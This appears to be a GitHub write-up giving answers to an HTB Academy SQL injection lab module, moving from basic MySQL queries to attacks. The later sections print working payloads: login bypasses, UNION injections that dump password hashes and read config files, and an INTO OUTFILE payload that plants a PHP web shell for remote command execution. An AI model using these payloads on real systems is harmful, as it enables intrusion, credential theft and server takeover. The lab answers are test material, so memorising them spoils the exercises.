<h1><ins>Intro to MySQL</ins></h1>
<h2>Task: Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?</h2>

![Screenshot 2024-12-03 203708](https://github.com/user-attachments/assets/5320c989-cf53-4e9b-ac38-27c8de4986fc)

<h1><ins>SQL Statements</ins></h1>
<h2>Task: What is the department number for the 'Development' department?</h2>
We use <code> use employees;</code> to select database then <code>show tables;</code> to see all tables, to find department number we use <code>select * from departments;</code>

![Screenshot 2024-12-03 204026](https://github.com/user-attachments/assets/cc2ddd1f-81d1-4feb-a1db-4efe83c38ecb)

<h1><ins>Query Results</ins></h1>
<h2>Task: What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?</h2>
We can use command <code>select * from employees where hire_date = "1990-01-01";</code> which give us only one result.

![Screenshot 2024-12-03 205310](https://github.com/user-attachments/assets/77f8127b-d93e-457d-8334-ffeb36386d0d)

<h1><ins>SQL Operators</ins></h1>
<h2>Task: In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?</h2>
We can use command <code>select * from titles where emp_no > 10000 OR title != 'engineer';</code>

![Screenshot 2024-12-03 210046](https://github.com/user-attachments/assets/848405f2-1be2-4bd6-9167-d040db935d7e)

<h1><ins>Subverting Query Logic</ins></h1>
<h2>Task: Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?</h2>
using <code>tom' or '1'='1</code> as username input we can bypass login with any password

![Screenshot 2024-12-03 211949](https://github.com/user-attachments/assets/354fa0c5-b1e6-4e5f-a37e-2c70df03a5e9)

<h1><ins>Using Comments</ins></h1>
<h2>Task: Login as the user with the id 5 to get the flag.</h2>
Using or statment and user that is very unlikely to exist we login with id 5 by using <code>blahblah' or id = 5)-- </code> as our input

![Screenshot 2024-12-03 213430](https://github.com/user-attachments/assets/21af8ee0-c8c3-4733-ba9c-cfc250f4dbd0)

<h1><ins>Union Clause</ins></h1>
<h2>Task: Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.</h2>
using <code>SELECT * FROM employees UNION SELECT dept_no, dept_name, 2, 3, 4, 5 from departments;</code> we get table of both connected tables.

![Screenshot 2024-12-03 214530](https://github.com/user-attachments/assets/fd988319-8d54-4c92-99b7-19279f5d14d3)

<h1><ins>Union Injection</ins></h1>
<h2>Task: Use a Union injection to get the result of 'user()</h2>
Using <code>cn' UNION select 1,user(),3,4-- -</code> we can find the user.

![Screenshot 2024-12-03 215514](https://github.com/user-attachments/assets/beebca7a-58d5-4125-aaa7-c329a3dd3d41)

<h1><ins>Database Enumeration</ins></h1>
<h2>Task: What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?</h2>
Folowing HTB writeup instead of using dev database we use ilfreight which helps us find new user hash using this <code>cn' UNION select 1, username, password, 4 from ilfreight.users-- -</code> SQL injection

![Screenshot 2024-12-04 165009](https://github.com/user-attachments/assets/f02431a9-ae64-47f6-9895-59157d745376)

<h1><ins>Reading Files</ins></h1>
<h2>Task: We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.</h2>
Runing <code>cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -</code> and checking source code we see that theres another config.php file which after modifying our previous injection to <code>cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -</code> and checking source code we can find flag.

![Screenshot 2024-12-04 165752](https://github.com/user-attachments/assets/3b7fce38-c0bb-49fa-b0f2-ccf60f7334dd)

<h1><ins>Writing Files</ins></h1>
<h2>Task: Find the flag by using a webshell.</h2>
Once we write file using <code>cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -</code> we can use url as our command pass.

![Screenshot 2024-12-04 170526](https://github.com/user-attachments/assets/83c006ce-3973-4cdd-8019-bf0e6eb37ec8)

<h1><ins>Skills Assessment - SQL Injection Fundamentals</ins></h1>
<h2>Task: Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.</h2>
To Gain access past login we use <code>admin' or '1'='1'-- -</code> and in search <code>' order by 6-- -</code> results are gone but if we use <code>' order by 5-- -</code> results are back which means theres 5 collumns.
After using <code>cn' UNION SELECT 1, user, 3, 4, 5 from mysql.user-- -</code> we can see that we are root user and using <code>cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code> we see that our priviligaes allows file creaton. Since we are in dashboard page to create shell we write <code>cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "","" into outfile '/var/www/html/dashboard/shell.php'-- -</code> after using url input as our command pass we can find flag file.

![Screenshot 2024-12-04 174751](https://github.com/user-attachments/assets/ee43aa50-77c5-452b-aa4c-1dc8d4673810)
